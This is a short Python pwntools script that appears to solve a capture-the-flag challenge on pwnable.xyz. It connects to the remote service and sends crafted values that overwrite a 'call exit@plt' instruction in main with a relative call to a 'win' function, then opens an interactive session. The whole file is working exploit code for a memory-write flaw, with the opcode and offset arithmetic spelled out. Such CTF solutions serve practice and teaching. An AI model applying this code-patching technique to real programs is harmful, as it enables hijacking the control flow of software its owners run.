from pwn import *

elf = ELF("./challenge")
io = remote("svc.pwnable.xyz", 30029)

# replace "call exit@plt" at main+148 to "call win"
# opcode of call instruction: E8 <offset> (32 bits)

res = 0x555966402200
call_exit_ins = 0x0000555966200ac8
win = 0x0000555966200a21

v4 = 1
v5 = (((win - (call_exit_ins + 5)) & 0xffffffff) << 8) + 0xe8
v6 = (call_exit_ins - res) // 8


io.sendline(f"{v4} {v5 ^ 1} {v6}".encode())
io.sendline(b"pwned!")
io.interactive()